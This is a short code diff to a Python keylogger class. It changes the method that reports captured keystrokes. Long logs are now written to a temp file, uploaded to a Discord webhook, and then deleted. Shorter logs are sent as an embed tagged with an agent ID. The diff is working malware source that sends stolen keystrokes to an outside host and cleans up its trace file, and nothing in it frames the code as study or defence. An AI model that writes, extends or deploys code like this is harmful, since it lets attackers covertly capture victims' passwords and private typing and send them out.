@@ -29,10 +29,22 @@ class Keylogger:
         self.log += name
 
     def report_to_webhook(self):
+        flag = False
         webhook = DiscordWebhook(url=self.webhook, username="Keylogger")
-        embed = DiscordEmbed(title=f"Keylogger Report | Agent#{self.id} | Time: {self.end_dt}", description=self.log)
-        webhook.add_embed(embed)
+        if len(self.log) > 2000:
+            flag = True
+            path = os.environ["temp"] + "\\report.txt"
+            with open(path, 'w+') as file:
+                file.write(f"Keylogger Report | Agent#{self.id} | Time: {self.end_dt}\n\n")
+                file.write(self.log)
+            with open(path, 'rb') as f:
+                webhook.add_file(file=f.read(), filename='report.txt')
+        else:
+            embed = DiscordEmbed(title=f"Keylogger Report | Agent#{self.id} | Time: {self.end_dt}", description=self.log)
+            webhook.add_embed(embed)    
         webhook.execute()
+        if flag:
+            os.remove(path)
 
     def report(self):
         if self.log:
